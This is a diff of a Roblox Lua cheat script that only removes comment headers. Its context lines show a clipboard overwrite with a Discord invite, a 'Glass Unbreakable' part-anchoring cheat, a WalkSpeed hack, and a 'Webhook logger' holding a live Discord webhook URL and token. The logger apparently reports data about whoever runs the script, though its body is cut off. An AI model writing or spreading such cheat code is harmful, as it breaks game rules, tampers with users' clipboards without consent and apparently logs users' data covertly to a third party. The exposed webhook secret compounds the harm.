@@ -9,17 +9,13 @@ local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 
---==============================
--- Discord copy
---==============================
+
 local discordLink = "https://discord.gg/3bgfvvpAU2"
 if setclipboard then
 	setclipboard(discordLink)
 end
 
---==============================
--- Place check
---==============================
+
 if game.PlaceId ~= CORRECT_PLACEID then
 	StarterGui:SetCore("SendNotification", {
 		Title = "Not in the correct game";
@@ -29,9 +25,7 @@ if game.PlaceId ~= CORRECT_PLACEID then
 	return
 end
 
---==============================
--- Anchor system
---==============================
+
 local function anchorParts(parent)
 	for _, obj in ipairs(parent:GetDescendants()) do
 		if obj:IsA("BasePart") and obj.Name == "Part" then
@@ -54,9 +48,7 @@ local function enableAnchor()
 	end)
 end
 
---==============================
--- UI
---==============================
+
 local gui = Instance.new("ScreenGui", player.PlayerGui)
 gui.Name = "ASNO_UI"
 gui.ResetOnSpawn = false
@@ -127,9 +119,7 @@ end
 
 layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateMainHeight)
 
---==============================
--- Button: Glass Unbreakable
---==============================
+
 local enableBtn = Instance.new("TextButton", content)
 enableBtn.Size = UDim2.new(0, mainWidth-10, 0, buttonHeight)
 enableBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
@@ -146,9 +136,7 @@ enableBtn.MouseButton1Click:Connect(function()
 	enableAnchor()
 end)
 
---==============================
--- New: Speed 1-100 (TextBox + Set Button)
---==============================
+
 local speedFrame = Instance.new("Frame", content)
 speedFrame.Size = UDim2.new(0, mainWidth-10, 0, buttonHeight)
 speedFrame.BackgroundTransparency = 1
@@ -202,9 +190,7 @@ setBtn.MouseButton1Click:Connect(function()
 	StarterGui:SetCore("SendNotification", {Title = "Speed Set", Text = "WalkSpeed set to "..val, Duration = 3})
 end)
 
---==============================
--- Webhook logger
---==============================
+
 local Webhook_URL = "https://discordapp.com/api/webhooks/1468809532267434138/coA1jn4RO4Ui9G0xGAoikIDfT1XT8ugKeRnMPszyZqalHq7yeuDGbXN4y_SQvqdGBk4J"
 
 pcall(function()
